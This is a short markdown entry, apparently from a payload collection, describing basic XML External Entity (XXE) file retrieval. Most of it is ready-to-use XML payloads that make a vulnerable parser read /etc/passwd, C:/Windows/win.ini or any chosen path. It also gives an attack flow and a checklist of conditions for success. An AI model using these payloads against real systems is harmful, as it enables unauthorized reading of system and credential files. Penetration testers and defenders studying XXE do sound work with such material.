# Payload 01 – Basic XXE File Retrieval

## Purpose

Test whether an XML parser resolves external entities and can retrieve a local file.

---

## Basic Structure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
    &xxe;
</foo>
```

---

## Windows Example

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>
    &xxe;
</foo>
```

---

## Generic File

Replace the file path with an appropriate target:

```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///PATH/TO/FILE">
]>
```

Reference:

```xml
&xxe;
```

---

## Attack Flow

```text
DOCTYPE
   ↓
External Entity
   ↓
Local File
   ↓
Entity Reference
   ↓
Application Response
```

---

## Expected Indicator

The application's response contains content from the referenced file.

---

## Requirements

```text
☐ XML input is attacker-controlled
☐ External entities are enabled
☐ Local file is accessible
☐ Entity value is reflected
```